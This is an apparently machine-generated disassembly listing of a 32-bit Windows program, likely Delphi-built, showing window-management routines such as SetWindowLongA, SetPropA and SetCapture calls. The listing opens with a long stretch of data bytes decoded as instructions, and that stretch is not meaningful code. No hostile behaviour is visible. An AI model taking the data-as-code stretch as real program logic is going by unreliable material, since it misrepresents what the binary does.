imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
je r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ eax + edx * 2 ] bl
inc esp
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5020c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
shl [ eax ] 0x50
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
push ecx
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax ] ah
push ecx
inc esp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
push eax
inc esp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
insb
inc ebx
jne r-xdata
push ebx
dec eax
popad
outsb
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
outsb
popad
jb r-xdata
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x44 ] bh
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push ebx
inc esp
adc [ eax ] eax
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add al ah
mov ah 0x44
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax - 0x3a ] al
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
outsd
push ecx
inc esp
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
xor eax 0xd32c0040
outsd
insb
jae r-xdata
mov eax eax
les edx [ ecx + 0x44 ]
outsb
je r-xdata
inc ebx
outsd
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
push ecx
inc esp
add [ ebx + 0x445180c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
and [ ecx + 0x44 ] dl
add [ eax ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ ebp + edx * 2 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl [ ebx + 0x44 ]
add [ edx + 0x4004455 ] bl
add al [ eax ]
add [ ebx + ecx * 2 ] ch
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
add [ eax ] al
add [ eax ] al
or [ ebx + 0x44 ] dl
add bh bh
inc [ eax + 0x52 ]
inc esp
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
rol ah 0x51
inc esp
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
dec esi
popad
insd
mov eax eax
rcl [ eax + 0x44 ] 0x0
shl [ eax + 0xa004450 ] 0x8
sbb [ edx ] eax
hlt
insb
jae r-xdata
push esp
dec ecx
insd
or cl [ eax ]
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
and al 0x51
sub_4450d8
fcom [ eax + 0x44 ]
add [ ebx ] al
or [ edx + eax * 2 + 0x65 ] edx
jbe r-xdata
outsd
jo r-xdata
insb
inc ebx
jne r-xdata
or [ edx + 0x65 ] ah
inc edx
outsd
je r-xdata
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bl
push eax
inc esp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec esp
outsd
ja r-xdata
outsb
popad
jb r-xdata
outsd
insd
adc [ eax ] eax
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
push ebx
inc esp
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add al ah
mov ah 0x44
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax - 0x3a ] al
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
outsd
push ecx
inc esp
inc eax
add [ ecx ] al
jns r-xdata
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
add [ ebp + edx * 2 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dl [ ebx + 0x44 ]
add [ edx + 0x4004455 ] bl
add al [ eax ]
add [ ebx + ecx * 2 ] ch
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
add [ eax ] al
add [ eax ] al
or [ ebx + 0x44 ] dl
add bh bh
inc [ eax + 0x52 ]
inc esp
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
push ecx
inc esp
add [ ebx + 0x445180c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
and [ ecx + 0x44 ] dl
add [ eax ] esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add [ ecx + edx * 2 + 0x44 ] bh
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
sbb [ edx ] eax
hlt
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
rcl [ eax + 0x44 ] 0x0
add [ esp + edx * 2 ] ecx
inc edx
outsd
jb r-xdata
and al 0x51
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
xor eax 0xd32c0040
outsd
insb
jae r-xdata
mov eax eax
les edx [ ecx + 0x44 ]
outsb
je r-xdata
inc ebx
outsd
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
push ecx
inc esp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
jb r-xdata
pop es
add [ edi ] cl
or al 0x49
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
rol ah 0x51
inc esp
bound esp [ ebp + 0x54 ]
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push ecx
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
sub_445500
inc esp
add [ eax ] dl
int1
inc esp
add [ ecx + esi * 8 + 0x44 ] ch
add al cl
out dx al
inc esp
add [ ebp + ecx * 8 + 0x44 ] ch
add al bh
cmc
inc esp
add [ eax - 0x1c ] cl
inc esp
add [ 0xffffffffe55c0044 ] dh
inc esp
add [ eax ] dh
jmp r-xdata
add al ah
in eax 0x44
add al cl
out 0x44 al
add [ eax + 0x7c0044e7 ] bl
0xe22c0044 0x44
sub_445719
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esp + edx + 0x45 ] dh
add ah cl
add al [ ebp ]
hlt
sub_4459cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x5a
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_445abc
pushfd
pop edx
inc esp
add [ esi - 0x4fffbba6 ] ah
pop edx
inc esp
add [ ecx ] ah
pop edx
inc esp
add [ ecx ] ch
pop edx
inc esp
add [ ecx ] dh
pop edx
inc esp
add [ ecx ] bh
pop edx
inc esp
add [ esi + 0x5a ] al
inc esp
add [ ebx + 0x5a ] dl
inc esp
add [ eax + 0x5a ] ah
inc esp
add [ ebp + 0x5a ] ch
inc esp
add [ edx + 0x5a ] bh
inc esp
add [ edi - 0x6bffbba6 ] al
pop edx
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x5abce870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x5b ] ah
inc esp
add ah dh
pop edx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x780044 ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] eax
cwde
xor eax 0x5b840040
inc eax
add [ eax - 0x53ffbfa5 ] dl
xor eax 0x35a00040
inc eax
add [ eax + 0x1c00405b ] ah
xor eax [ eax ]
je r-xdata
add [ eax + 0x33 ] al
inc ebp
add ah dh
xor [ ebp ] al
or al 0x1c
inc ebp
add ah dl
sub al [ ebp ]
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x54 ] bp
jb r-xdata
inc ebp
add al cl
sbb eax 0x1f400045
inc ebp
add [ eax + 0x1f ] dl
inc ebp
add [ eax ] dl
daa
inc ebp
add al bh
sub [ ebp ] eax
cmp [ eax * 2 + 0x452e3c00 ] ch
add [ eax ] al
inc eax
pop ebp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
pop ebp
inc esp
add [ eax ] cl
add al [ eax ]
add ah dh
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esi + esi * 4 ] al
inc esp
add ah cl
add al [ ebp ]
hlt
mov eax eax
in al 0x5b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
pop ebx
inc esp
add [ eax ] ch
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax ] ch
inc eax
inc ebp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
adc eax 0x19140042
inc edx
add al ah
mov ah 0x44
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax + 0x200044f6 ] cl
mov eax 0xbeb40044
inc esp
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax - 0x3a ] al
inc esp
add [ ecx + ecx * 8 ] bh
inc esp
add [ edi + eax * 8 + 0x44 ] ch
add ah ch
int3
nop
cmp [ esp + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_445d80
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_445e38
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_445e6c
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404624
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_445e38
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_445ec8
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_4460ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c814
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404684
mov eax edi
mov edx esi
call sub_4041b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4460f0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c814
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404684
mov eax edi
mov edx esi
call sub_4041b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44615c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
jne r-xdata
mov eax ebx
call sub_44f7b4
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_446208
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4188a0
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_44623c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_446264
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44623c
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_446208
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418744
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41891c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4462c0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418778
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4188a0
mov edx 0x8
call sub_40270c
inc esi
dec ebx
jne r-xdata
sub_4462f4
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4188a0
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_446208
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_446358
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_4463b8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4032b8
mov edx esp
mov eax esi
call sub_4043c8
add esp 0x100
pop esi
pop ebx
retn
sub_4463f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4464be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_447514
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446e9c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_446e9c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_447514
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_446e9c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_447514
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4464c3
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_468b5c
call sub_403b98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_447514
sub_44651c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_446546
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4465ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446358
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_4465d8
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403564
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_446604
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403564
xor edx edx
sub_44665c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4513b8
sub_44667c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4513a0
sub_4466a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_446588
mov dl 0x1
mov eax [ r-xdata ]
call sub_4247fc
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_429984
mov edx eax
mov eax esi
call sub_424978
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_446704
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_446734
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4465ac
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_446790
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403564
pop edi
pop esi
pop ebp
retn 0x4
sub_4467b4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4467d8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
